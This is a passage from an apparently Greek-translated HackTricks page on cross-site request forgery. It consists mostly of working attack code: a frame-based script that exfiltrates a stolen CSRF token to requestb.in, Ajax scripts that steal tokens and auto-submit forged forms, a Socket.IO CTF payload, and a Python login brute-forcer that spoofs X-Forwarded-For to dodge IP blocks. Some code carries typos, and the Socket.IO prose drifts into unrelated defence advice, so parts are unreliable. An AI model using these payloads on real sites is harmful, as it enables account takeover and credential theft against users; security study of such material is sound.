document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTΚλέψτε το CSRF token με Ajax και στείλτε ένα post με ένα φόρμα**

To steal the CSRF token using Ajax and send a POST request with a form, you can use the following technique:

```html
<script>
    // Create a new XMLHttpRequest object
    var xhr = new XMLHttpRequest();

    // Send a GET request to retrieve the CSRF token
    xhr.open('GET', '/get_csrf_token', true);
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // Extract the CSRF token from the response
            var csrfToken = xhr.responseText;

            // Create a new form element
            var form = document.createElement('form');
            form.method = 'POST';
            form.action = '/process_form';

            // Create an input field for the CSRF token
            var csrfInput = document.createElement('input');
            csrfInput.type = 'hidden';
            csrfInput.name = 'csrf_token';
            csrfInput.value = csrfToken;

            // Add the CSRF token input field to the form
            form.appendChild(csrfInput);

            // Submit the form
            document.body.appendChild(form);
            form.submit();
        }
    };
    xhr.send();
</script>
```

This code snippet uses Ajax to send a GET request to retrieve the CSRF token from the server. Once the token is obtained, it creates a new form element and adds an input field with the CSRF token as a hidden value. Finally, the form is submitted to the desired endpoint using the POST method.

By executing this code on a vulnerable website, an attacker can steal the CSRF token and use it to perform unauthorized actions on behalf of the victim.
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF με το Socket.IO

Socket.IO είναι μια βιβλιοθήκη JavaScript που επιτρέπει την ανάπτυξη πραγματικού χρόνου εφαρμογών διαδικτύου. Ωστόσο, μπορεί να χρησιμοποιηθεί και για εκτέλεση CSRF επιθέσεων.

Για να εκμεταλλευτείτε μια ευπάθεια CSRF με το Socket.IO, πρέπει να εξασφαλίσετε ότι οι αιτήσεις που στέλνονται από τον πελάτη περιέχουν το απαιτούμενο CSRF token. Αυτό το token πρέπει να είναι μοναδικό για κάθε συνεδρία και να ελέγχεται από τον διακομιστή πριν από την επεξεργασία της αίτησης.

Για να προστατεύσετε το Socket.IO από CSRF επιθέσεις, μπορείτε να χρησιμοποιήσετε την παράμετρο `cookie` κατά την αρχικοποίηση του διακομιστή. Αυτό θα επιτρέψει στο Socket.IO να χρησιμοποιεί τα cookies του πελάτη για την επαλήθευση του CSRF token.

Επιπλέον, μπορείτε να χρησιμοποιήσετε την παράμετρο `secure` για να απαιτήσετε τη χρήση ασφαλούς σύνδεσης (HTTPS) για την αποστολή των cookies. Αυτό θα προστατεύσει τα cookies από επιθέσεις Man-in-the-Middle.

Τέλος, είναι σημαντικό να ελέγχετε την προέλευση των αιτήσεων που λαμβάνετε στον διακομιστή σας. Ανακατευθύνσεις από άλλους τομείς θα πρέπει να απορρίπτονται.

Ακολουθώντας αυτές τις προφυλάξεις, μπορείτε να προστατεύσετε το Socket.IO από επιθέσεις CSRF και να διατηρήσετε την ασφάλεια των εφαρμογών σας.
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Βίαιη Δύναμη Σύνδεσης

Ο κώδικας μπορεί να χρησιμοποιηθεί για τη βίαιη δύναμη ενός φόρμας σύνδεσης χρησιμοποιώντας ένα CSRF token (Χρησιμοποιεί επίσης τον κεφαλίδα X-Forwarded-For για να προσπαθήσει να παρακάμψει μια πιθανή μαύρη λίστα IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Εργαλεία <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Αναφορές

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Συμμετέχετε στον διακομιστή [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) για να επικοινωνήσετε με έμπειρους χάκερ και κυνηγούς ευρημάτων ασφαλείας!

**Εισαγωγή στο Hacking**\
Ασχοληθείτε με περιεχόμενο που εξερευνά τον ενθουσιασμό και τις προκλήσεις του χάκινγκ

**Ειδήσεις Χάκινγκ σε Πραγματικό Χρόνο**\
Μείνετε ενημερωμένοι με τον γρήγορο ρυθμό του κόσμου του χάκινγκ μέσω ειδήσεων και αναλύσεων σε πραγματικό χρόνο

**Τελευταίες Ανακοινώσεις**\
Μείνετε ενημερωμένοι με τις νεότερες ανταμοιβές ευρημάτων ασφαλείας που ξεκινούν και τις κρίσιμες ενημερώσεις της πλατφόρμας

**Συμμετέχετε στο** [**Discord**](https://discord.com/invite/N3FrSbmwdy) **και αρχίστε να συνεργάζεστε με τους κορυφαίους χάκερ σήμερα!**

<details>

<summary><strong>Μάθετε το χάκινγκ του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι για να υποστηρίξετε το HackTricks:

* Εάν θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**The PEASS Family**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Συμμετάσχετε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) **και** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **αποθετήρια του github.**

</details>
